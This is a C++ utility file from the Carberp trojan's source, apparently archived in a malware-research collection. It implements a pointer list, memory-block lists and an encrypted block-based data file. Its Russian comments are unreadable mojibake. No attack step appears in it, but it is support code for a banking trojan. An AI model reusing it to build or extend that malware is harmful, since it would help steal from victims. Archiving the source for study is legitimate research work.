/*
  name      Carberp
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */

#include <windows.h>

#include "GetApi.h"
#include "BotClasses.h"
#include "Memory.h"
#include "Strings.h"
#include "wincrypt.h"


/*----------------  ������ ��� ������ �� �������� ��������� -----------------*/

DWORD MaxListSize = 4000000;

typedef struct TListRec
{
	PDWORD Items;    // ������ ���������
	DWORD Count;     // ���������� ��������� � ������
	DWORD Capacity;  // ���������� ����������������� ���������
	TFreeItemMethod FreeMethod; // ����� ����������� ���������

} *PListRec;


PList List::Create()
{
	// ������� �������� ������
	PListRec Result = CreateStruct(TListRec);
	SetCapacity(Result, 32);
	return (PList)Result;
}
//----------------------------------------------------------------------------


void List::Free(PList List)
{
    // ������� ����������� ������
 if (List == NULL)
		return;

	List::Clear(List);
	FreeStruct(List);
}
//----------------------------------------------------------------------------

void List::Clear(PList List)
{
	// ������� ������� ������
	if (List == NULL)
		return;
	PListRec LR = (PListRec)List;

	// ���������� ��������
	if (LR->FreeMethod != NULL)
	{
		DWORD i;
		LPVOID Item;
		for (i = 0; i < LR->Count; i++)
		{
			Item = (LPVOID)LR->Items[i];
			if (Item != NULL)
                LR->FreeMethod(Item);
		}
	}
    // ������� ������
	HEAP::Free(LR->Items);
	LR->Items = NULL;
	LR->Capacity = 0;
	LR->Count = 0;
}
//----------------------------------------------------------------------------

DWORD List::Count(PList List)
{
	// ������� ���������� ���������� ��������� ������
	if (List == NULL)
		return 0;
	else
		return ((PListRec)List)->Count;

}
//----------------------------------------------------------------------------

bool ListUpdateCapacity(PListRec List)
{
	// �������� ������ ���������� ������

	// ����������� ��������� ���������� ������
	DWORD Delta;
	if (List->Capacity > 64)
		Delta = List->Capacity / 4;
	else
	if (List->Capacity > 8)
		Delta = 16;
	else
		Delta = 4;

	// ������������� ����� ������
    return List::SetCapacity((PList)List, List->Capacity + Delta);
}
//----------------------------------------------------------------------------

bool List::SetCapacity(PList List, DWORD Value)
{
	// �������� ������ ������������������ ���������
	if (List == NULL || Value > MaxListSize)
		return false;

	PListRec LR = (PListRec)List;
	if (Value > LR->Count && Value != LR->Capacity)
	{
        // ������ ����� �����
		if (HEAP::ReAlloc2((LPVOID &)LR->Items, Value * sizeof(LPVOID)))
		{
			LR->Capacity = Value;
			return true;
        }
	}
	return false;
}
//----------------------------------------------------------------------------

int List::Add(PList List, LPVOID Item)
{
	// ������� ��������� ����� �������
	if (List == NULL)
		return -1;
	PListRec LR = (PListRec)List;

	if (LR->Count == LR->Capacity)
		if (!ListUpdateCapacity(LR))
			return -1;

	DWORD Result = LR->Count;
	LR->Count++;
	LR->Items[Result] = (DWORD)Item;
	return Result;
}
//----------------------------------------------------------------------------

void List::Delete(PList List, DWORD Index)
{
	// ������� ������� ������� �� ������
	if (List == NULL || Index >= ((PListRec)List)->Count)
		return;

	PListRec LR = (PListRec)List;
    LPVOID Temp = (LPVOID)LR->Items[Index];

	LR->Count--;
	if (Index < LR->Count)
	{
		// ��������� ���� ������ ����������� �� �������� ���������
		PDWORD Dest = LR->Items;
		Dest += Index;
		PDWORD Source = Dest;
		Source++;
        m_memcpy(Dest, Source, (LR->Count - Index)*sizeof(PDWORD));
	}
	// ��� ������������� ���������� �������
	if (Temp != NULL && LR->FreeMethod != NULL)
		LR->FreeMethod(Temp);

}
//----------------------------------------------------------------------------

// ������� �������
 LPVOID List::Extract(PList List, DWORD Index)
 {
	// �������  ��������� ������� �� ������ �� ��������� ���
    PListRec LR = (PListRec)List;
	if (List == NULL || Index >= LR->Count)
		return NULL;

	LPVOID Temp = (LPVOID)LR->Items[Index];
	LR->Items[Index] = 0;
	Delete(List, Index);
	return Temp;
 }

//----------------------------------------------------------------------------

int List::Remove(PList List, LPVOID Item)
{
	// ������� �� ������ �������
	int Index = IndexOf(List, Item);
	if (Index >= 0)
		Delete(List, Index);
    return Index;
}
//----------------------------------------------------------------------------

int List::IndexOf(PList List, LPVOID Item)
{
	// ������� ���������� ������� �������� � ������
	if (List == NULL)
		return -1;

    PListRec LR = (PListRec)List;
	DWORD Index;
	for (Index = 0; Index < LR->Count; Index++)
		if ((LPVOID)LR->Items[Index] == Item)
			return Index;
	return -1;
}
//----------------------------------------------------------------------------


void List::SetItem(PList List, DWORD Index, LPVOID Item)
{
	// ������� ������������� �������� �������� � ��������� ������� Index
	if (List == NULL || Index >= ((PListRec)List)->Count)
		return;
    PListRec LR = (PListRec)List;

	LPVOID Old = (LPVOID)LR->Items[Index];
	LR->Items[Index] = (DWORD)Item;
	if (Old != NULL && LR->FreeMethod != NULL)
		LR->FreeMethod(Old);
}
//----------------------------------------------------------------------------

LPVOID List::GetItem(PList List, DWORD Index)
{
	// ������� ���������� �������� �������� �� ������� Index
	if (List == NULL || Index >= ((PListRec)List)->Count)
		return NULL;

    return (LPVOID)((PListRec)List)->Items[Index];
}
//----------------------------------------------------------------------------

void List::SetFreeItemMehod(PList List, TFreeItemMethod Method)
{
	// ���������� ����� ��������������� �������� ���������
	if (List != NULL)
		((PListRec)List)->FreeMethod = Method;
}

LPVOID List::Last(PList List)
{
	// ������� ���������� ��������� ������� ������
	if (List == NULL) return NULL;
    return List::GetItem(List, List::Count(List) - 1);
}


//---------------------------------------------------------------------------
//  MEMBLOCKS - ������� ��� ������ � ������� ������, �������� ������
//---------------------------------------------------------------------------
PMemBlockList MEMBLOCK::CreateList()
{
	// ������� ������ ������
	PMemBlockList List = List::Create();
	List::SetFreeItemMehod(List, (TFreeItemMethod)FreeBlock);
    List::SetCapacity(List, 64);
	return List;
}

void MEMBLOCK::FreeList(PMemBlockList List)
{
	// ���������� ������ ������
	List::Free(List);
}


void MEMBLOCK::FreeBlock(PMemBlock Block)
{
	// ���������� ���� ������
	if (Block == NULL) return;
	MemFree(Block->Data);
    FreeStruct(Block);
}

PMemBlock MEMBLOCK::AddBlock(PMemBlockList List, LPVOID Data, DWORD DataSize, bool Copy)
{
    // �������� ����� ���� � ������
	if (List == NULL || Data == NULL || DataSize == 0)
		return NULL;

	PMemBlock Block = CreateStruct(TMemBlock);
	if (Block == NULL) return NULL;

	if (Copy)
	{
		Block->Data = MemAlloc(DataSize);
		if (Block->Data == NULL)
		{
			FreeStruct(Block);
			return NULL;
        }
		m_memcpy(Block->Data, Data, DataSize);
	}
	else
		Block->Data = Data;
	Block->Size = DataSize;
	List::Add(List, Block);
	return Block;
}

DWORD MEMBLOCK::Size(PMemBlockList List)
{
	// ������� ������������ ����� ������ ������ ���� ������ ������
	if (List == NULL) return 0;
	DWORD Sz = 0;
	DWORD Count = List::Count(List);
	for (DWORD i = 0; i < Count; i++)
	{
		PMemBlock B = (PMemBlock)List::GetItem(List, i);
        Sz += B->Size;
	}
    return Sz;
}

void MEMBLOCK::BuildToBuf(PMemBlockList List, LPVOID Buf)
{
	// ������� �������� ������ ���� ������ � ����� Buf.
	// ���������������, ��� Buf ����� �������� � ���� ��� �����
    if (List == NULL || Buf == NULL) return;

	DWORD Count = List::Count(List);
	if (Count == 0) return;

	PCHAR Temp = (PCHAR)Buf;

	for (DWORD i = 0; i < Count; i++)
	{
		PMemBlock Block = (PMemBlock)List::GetItem(List, i);
		m_memcpy(Temp, Block->Data, Block->Size);
		Temp += Block->Size;
	}
}


PCHAR MEMBLOCK::BuildAsStr(PMemBlockList List, DWORD *TotalSize)
{
	// ������� �������� ��� ����� � ������
	DWORD StrSize = Size(List);
	if (TotalSize != NULL)
		*TotalSize = StrSize;
	if (StrSize == 0) return NULL;

	PCHAR Str = STR::Alloc(StrSize);
    BuildToBuf(List, Str);
    return Str;
}

// ������� �������� ��� ����� � ������
LPVOID MEMBLOCK::BuildAsMem(PMemBlockList List, DWORD *TotalSize)
{
	DWORD BufSize = Size(List);
	if (TotalSize != NULL)
		*TotalSize = BufSize;
	if (BufSize == 0) return NULL;

	// ��� ������������� � ��������� ��������� ����� � ����� ������ �������
	// �������������� ����
	LPVOID Buf = MemAlloc(BufSize + 1);
	BuildToBuf(List, Buf);
	*((PCHAR)Buf + BufSize) = 0;
	return Buf;
}


PMemBlock MEMBLOCK::Pack(PMemBlockList List)
{
	// ������� ���������� ����� � ����
	DWORD Count = List::Count(List);
	if (Count == 0) return NULL;

	if (Count > 1)
	{
		DWORD Size = 0;
		LPVOID Mem = BuildAsMem(List, &Size);
		List::Clear(List);
        MEMBLOCK::AddBlock(List, Mem, Size, false);
	}
	return (PMemBlock)List::GetItem(List, 0);
}

PMemBlock MEMBLOCK::GetBlockByID(PMemBlockList List, DWORD ID)
{
	// �������� ���� �� ��������������
	if (List == NULL)
		return NULL;

	for (DWORD i = 0; i < List::Count(List); i++)
    {
		PMemBlock Block = (PMemBlock)List::GetItem(List, i);
		if (Block == NULL)
			continue;
		if (Block->ID == ID)
			return Block;
	}

	return NULL;
}

PCHAR MEMBLOCK::GetBlockByAsStr(PMemBlockList List, DWORD ID)
{
	// �������� ���� ��� ������
	PMemBlock Block = GetBlockByID(List, ID);
	if (Block != NULL)
		return STR::New((PCHAR)Block->Data, Block->Size);
	else
		return NULL;
}


//---------------------------------------------------------------------------
//  DataFile - ������ ��� ������ � ������� �������
//---------------------------------------------------------------------------

#pragma pack(push, 1)
// ��������� ����� ������
typedef struct TDataBlockHead
{
	DWORD Signature;
	DWORD ID;
	DWORD Size;
}*PDataBlockHead;
#pragma pack(pop)

// ��������� �����, ��������� ����� ������
#define DATA_BLOCK_SIGNATURE  0x40F714CE



PDataFile DataFile::CreateFile(PCHAR FileName, DWORD Signature)
{
	// ������� ������ ���� � ������ FileName, ������ ��������� ��������
	// ����� �� ��� ���� ������ � ���� �� ����������
	HANDLE File	= (HANDLE)pCreateFileA(FileName, GENERIC_WRITE, FILE_SHARE_READ, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	if (File == INVALID_HANDLE_VALUE)
		return NULL;

	PDataFile Rec = CreateStruct(TDataFile);
	if (Rec == NULL)
	{
		pCloseHandle(File);
		return NULL;
	}

	// �������������� ��������� �����
    Rec->FileName = STR::New(FileName);
	Rec->Handle = File;
    Rec->Blocks = MEMBLOCK::CreateList();

	Rec->Head.Signature = Signature;
	Rec->Head.Version   = DATA_FILE_VERSION;

	return Rec;
}

PDataFile DataFile::OpenFile(PCHAR FileName, DWORD Signature)
{
	// ������� ��������� ���� ��� ������ � ������ �� ���� ���������
	HANDLE Handle	= (HANDLE)pCreateFileA(FileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (Handle == INVALID_HANDLE_VALUE)
		return NULL;

	PDataFile File = CreateStruct(TDataFile);
	if (File == NULL)
	{
		pCloseHandle(Handle);
		return NULL;
	}

    File->Handle = Handle;

	// ������ ��������� �����
	DWORD Readed = 0;
	pReadFile(Handle, &File->Head, sizeof(File->Head), &Readed, NULL);
	if (Readed != sizeof(File->Head) ||
		File->Head.Version > DATA_FILE_VERSION ||
		(Signature != 0 && File->Head.Signature != Signature))
	{
		pCloseHandle(Handle);
		FreeStruct(File);
		return NULL;
	}

	return File;
}

void DataFile::CloseFile(PDataFile File)
{
	// ������� ��������� ���� � ���������� ��������� File
	if (File == NULL) return;

	if (File->Handle != NULL)
		pCloseHandle(File->Handle);

    STR::Free(File->FileName);

	// ����������� ������ ���������
	MEMBLOCK::FreeList(File->Blocks);
    FreeStruct(File);
}

bool DataFile::WriteFile(PDataFile File)
{
	// ���������� ������ �� ��������� File � ���������� ����
	if (File == NULL || File->Handle == NULL) return false;

	DWORD Size = sizeof(File->Head);
	DWORD Written = 0;
	pWriteFile(File->Handle, &File->Head, Size, &Written, NULL);
	if (Written != Size) return false;

	return WriteBlocksToFile(File);
}

// ������ ������ �� ����������� ����� � ��������� File
bool DataFile::ReadFile(PDataFile File)
{
	// ������ ����� ������
	if (File == NULL || File->Handle == NULL)
		return false;

	return !ReadBlocksFromFile(File);
}


void DataFile::AddDataBlock(PDataFile File, DWORD BlockID, LPVOID Data, DWORD DataSize, bool Copy)
{
	// �������� ���� ������
	if (File == NULL) return;

	// ��� ���������� ����� ������ �� ����� ������������ �������
	// MEMBLOCK::AddBlock ��� ��� �� ���������� ������ �����, � ���
	// � ����� ������ ����� �� ����������

	PMemBlock Block = CreateStruct(TMemBlock);
	if (Block == NULL) return;
	Block->ID = BlockID;
	Block->Size = DataSize;

	if (Copy)
	{
		Block->Data = MemAlloc(DataSize);
		if (Block->Data == NULL)
		{
			FreeStruct(Block);
			return;
        }
		m_memcpy(Block->Data, Data, DataSize);
	}
	else
		Block->Data = Data;

    List::Add(File->Blocks, Block);
}

void DataFile::AddDataBlock(PDataFile File, DWORD BlockID, PCHAR StrData)
{
	DWORD Size = StrCalcLength(StrData);
    AddDataBlock(File, BlockID, StrData, Size, true);
}



LPVOID CryptBlockData(PMemBlock Block, LPVOID Key, TCryptMethod Method, PDWORD OutSize)
{
	// ����������� ���� ������, ������� ��������� ������ ����� ������������
	if (Block == NULL || Block->Size == 0 || Block->Data == NULL ||
		Key == NULL || Method == NULL)
		return NULL;

	LPVOID NewBuf = MemAlloc(Block->Size);
	if (NewBuf == NULL) return NULL;

    *OutSize = Block->Size;
	m_memcpy(NewBuf, Block->Data, Block->Size);
	if (!Method(Key, (LPBYTE)NewBuf, Block->Size, OutSize))
	{
		MemFree(NewBuf);
		NewBuf = NULL;
    }
	return NewBuf;
}

bool DataFile::WriteBlocksToFile(PDataFile File)
{
	// �������� ����� ������ � ����
	if (File == NULL || File->Handle == NULL) return false;

	// ���������� ����� ������ � ����
	DWORD Count = List::Count(File->Blocks);

	TDataBlockHead BH;
	BH.Signature = DATA_BLOCK_SIGNATURE;

	DWORD WriteSize;
	DWORD WrittenSize;
	LPVOID Buf;
	bool FreeBuf;

    bool Result = true;

	for (DWORD i = 0; i < Count; i++)
	{
		PMemBlock Block = (PMemBlock)List::GetItem(File->Blocks, i);
		if (Block == NULL) continue;

		// �������������� ���������
		BH.ID   = Block->ID;
		BH.Size = Block->Size;

		// ���������� ���������
		WriteSize = sizeof(BH);
		pWriteFile(File->Handle, &BH, WriteSize, &WrittenSize, NULL);
		if (WriteSize != WrittenSize)
		{
			Result = false;
			break;
		}

		// ���������� ������
		FreeBuf = false;
		Buf = NULL;
		WriteSize = BH.Size;

		if (File->CryptMode == fcBlock)
			Buf = CryptBlockData(Block, File->CryptKey, File->CryptMethod, &WriteSize);

		if (Buf != NULL)
			FreeBuf = true;
		else
			Buf =  Block->Data;


		pWriteFile(File->Handle, Buf, WriteSize, &WrittenSize, NULL);

		if (FreeBuf)
			MemFree(Buf);

		if (WriteSize != WrittenSize)
		{
			Result = false;
			break;
		}
	}
	return Result;
}


bool DataFile::ReadBlocksFromFile(PDataFile File)
{
	// �������� ����� ������ � ����
	if (File == NULL || File->Handle == NULL)
		return false;

	if (File->Blocks == NULL)
		File->Blocks = MEMBLOCK::CreateList();

	bool Error = false;
	DWORD Size;
	DWORD Readed;
    TDataBlockHead BH;
	while (1)
	{
		// ������ ��������� �����
		Size =sizeof(BH);
		pReadFile(File->Handle, &BH, Size, &Readed, NULL);
		if (Readed != Size || BH.Signature != DATA_BLOCK_SIGNATURE)
		{
			Error = Readed != 0 || BH.Signature != DATA_BLOCK_SIGNATURE;
            break;
		}

		// ������ ������
		if (BH.Size != 0)
		{
			LPVOID Buf = MemAlloc(BH.Size);
			if (Buf == NULL)
			{
				Error = true;
				break;
			}

			pReadFile(File->Handle, Buf, BH.Size, &Readed, NULL);
			if (Readed != BH.Size)
			{
				MemFree(Buf);
				Error = true;
				break;
			}

			// �������������� ������
			if (File->CryptMode == fcBlock && File->DecryptMethod != NULL)
				if (!File->DecryptMethod(File->CryptKey, (LPBYTE)Buf, BH.Size, &BH.Size))
				{
					MemFree(Buf);
					Error = true;
					break;
                }


			AddDataBlock(File, BH.ID, Buf, BH.Size, false);
		}
	}

	// � ������ ������ ������ ������� ������
	if (Error)
		List::Clear(File->Blocks);

    return !Error;
}

bool DataFile::CryptBlocks(PMemBlockList Blocks, LPVOID Key, TCryptMethod Method)
{
	// ����������� ����� ������
	if (Blocks == NULL || Key == NULL || Method == NULL)
		return false;

	DWORD Count = List::Count(Blocks);
	for (DWORD i = 0; i < Count; i++)
    {
		PMemBlock Block = (PMemBlock)List::GetItem(Blocks, i);
		if (Block->Size == 0 || Block->Data == NULL) continue;

		if (!Method(Key, (LPBYTE)Block->Data, Block->Size, &Block->Size))
			return false;
	}
    return true;
}


